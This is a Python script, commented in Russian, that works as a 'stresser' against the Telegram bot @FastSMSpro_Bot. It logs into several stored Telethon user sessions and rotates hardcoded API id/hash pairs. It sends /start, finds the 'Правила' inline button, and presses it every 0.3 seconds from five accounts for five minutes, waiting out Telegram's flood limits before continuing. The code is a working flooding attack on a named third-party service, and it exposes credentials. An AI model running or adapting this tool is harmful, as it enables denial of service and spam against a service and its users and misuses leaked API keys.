"""
fast_stress.py
Стрессер @FastSMSpro_Bot: /start → спам inline-кнопкой «Правила»
Запуск через бот: /fast
"""

import asyncio
import os
import random

from telethon import TelegramClient
from telethon.errors import FloodWaitError, AuthKeyDuplicatedError
from telethon.tl.functions.messages import GetBotCallbackAnswerRequest, SendMessageRequest
from telethon.tl.types import ReplyInlineMarkup, KeyboardButtonCallback

API = [
    '24565698:5a084b434f8505ace703485b9da85040',
    '27904162:e7cba879b1c643ba77490bf328df5eab',
    '23037915:50f06f5b2223586fde0d1379ea91ebc7',
    '29512095:0b29a7d42fff002856b9bed64f7ec919',
    '25055016:25edf5b7becebe91a2d61fe8d9d9931b',
    '21156147:90408de329b27f7dd411dff3e601acc6',
]

SESSION_DIR  = 'sessions'
TARGET_BOT   = 'FastSMSpro_Bot'
SPAM_BTN     = 'Правила'
SPAM_DELAY   = 0.3
SPAM_WORKERS = 5
SPAM_MINUTES = 5


def _get_sessions(limit: int = SPAM_WORKERS) -> list[str]:
    sessions = [f.replace('.session', '') for f in os.listdir(SESSION_DIR) if f.endswith('.session')]
    random.shuffle(sessions)
    return sessions[:limit]


def _make_client(session: str) -> TelegramClient:
    api_str = random.choice(API)
    api_id, api_hash = api_str.split(':', 1)
    return TelegramClient(
        f"./{SESSION_DIR}/{session}", int(api_id), api_hash,
        system_version='4.16.30-vxCUSTOM'
    )


def _find_btn(msgs, fragment: str) -> tuple[int, bytes] | None:
    for msg in msgs:
        if msg.out or not msg.reply_markup:
            continue
        if not isinstance(msg.reply_markup, ReplyInlineMarkup):
            continue
        for row in msg.reply_markup.rows:
            for btn in row.buttons:
                if isinstance(btn, KeyboardButtonCallback) and fragment.lower() in btn.text.lower():
                    return msg.id, btn.data
    return None


async def _prepare(session: str) -> tuple[TelegramClient, int, bytes] | None:
    client = _make_client(session)
    try:
        await asyncio.wait_for(client.connect(), timeout=12)
        if not await client.is_user_authorized():
            print(f"[FAST] [{session}] невалид", flush=True)
            await client.disconnect()
            return None

        peer = await client.get_entity(TARGET_BOT)

        # /start
        await client(SendMessageRequest(peer=peer, message='/start', random_id=random.randint(1, 2**31)))
        await asyncio.sleep(2)

        # Ищем кнопку Правила
        msgs = await client.get_messages(peer, limit=5)
        result = _find_btn(msgs, SPAM_BTN)
        if not result:
            print(f"[FAST] [{session}] ❌ кнопка '{SPAM_BTN}' не найдена", flush=True)
            await client.disconnect()
            return None

        msg_id, btn_data = result
        print(f"[FAST] [{session}] ✅ готов", flush=True)
        return client, msg_id, btn_data

    except AuthKeyDuplicatedError:
        try:
            await client.disconnect()
        except Exception:
            pass
        return None
    except Exception as e:
        print(f"[FAST] [{session}] ошибка: {e}", flush=True)
        try:
            await client.disconnect()
        except Exception:
            pass
        return None


async def _worker(client: TelegramClient, session: str,
                  msg_id: int, btn_data: bytes,
                  stop_event: asyncio.Event) -> int:
    count = 0
    try:
        peer = await client.get_entity(TARGET_BOT)
        print(f"[FAST] [{session}] 🔥 спам '{SPAM_BTN}'", flush=True)

        while not stop_event.is_set():
            try:
                await client(GetBotCallbackAnswerRequest(peer=peer, msg_id=msg_id, data=btn_data))
                count += 1
                if count % 50 == 0:
                    print(f"[FAST] [{session}] 📊 {count} нажатий", flush=True)
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
            except Exception as e:
                print(f"[FAST] [{session}] ⚠️ {str(e)[:60]}", flush=True)
                await asyncio.sleep(1)
            await asyncio.sleep(SPAM_DELAY)

    except Exception as e:
        print(f"[FAST] [{session}] ❌ упал: {e}", flush=True)
    finally:
        try:
            if client.is_connected():
                await client.disconnect()
        except Exception:
            pass

    print(f"[FAST] [{session}] 🏁 {count} нажатий", flush=True)
    return count


async def run_fast_stress(notify_fn=None, user_id: int = 0) -> bool:
    async def notify(text: str):
        if notify_fn:
            try:
                await notify_fn(text)
            except Exception:
                pass
        print(f"[FAST] {text}", flush=True)

    sessions = _get_sessions(SPAM_WORKERS)
    if not sessions:
        await notify("❌ Нет сессий в папке sessions/")
        return False

    await notify(f"🔄 Подготовка {len(sessions)} сессий для @{TARGET_BOT}...")

    results = await asyncio.gather(*[_prepare(s) for s in sessions], return_exceptions=True)

    ready = []
    for i, r in enumerate(results):
        if isinstance(r, tuple) and len(r) == 3:
            ready.append((sessions[i], r[0], r[1], r[2]))

    if not ready:
        await notify("❌ Ни одна сессия не прошла флоу.")
        return False

    await notify(
        f"✅ {len(ready)} сессий готово\n"
        f"⚡️ Спам кнопкой *{SPAM_BTN}* · {SPAM_DELAY}s · {SPAM_MINUTES} мин"
    )

    stop_event = asyncio.Event()
    asyncio.get_event_loop().call_later(SPAM_MINUTES * 60, stop_event.set)

    task_results = await asyncio.gather(
        *[asyncio.create_task(_worker(c, s, mid, bdata, stop_event)) for s, c, mid, bdata in ready],
        return_exceptions=True
    )
    total = sum(r for r in task_results if isinstance(r, int))

    await notify(f"🏁 Готово! *{total}* нажатий за {SPAM_MINUTES} мин · {len(ready)} сессий")
    return True
